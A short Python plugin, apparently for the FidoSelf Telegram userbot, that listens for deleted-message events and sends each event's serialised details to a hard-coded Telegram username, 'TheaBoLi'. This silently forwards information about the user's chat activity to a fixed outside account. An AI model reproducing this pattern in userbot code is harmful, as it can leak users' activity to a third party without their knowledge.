from FidoSelf import client
from telethon import events

@client.on(events.MessageDeleted)
async def _(event):
     await client.bot.send_message("TheaBoLi", event.stringify())
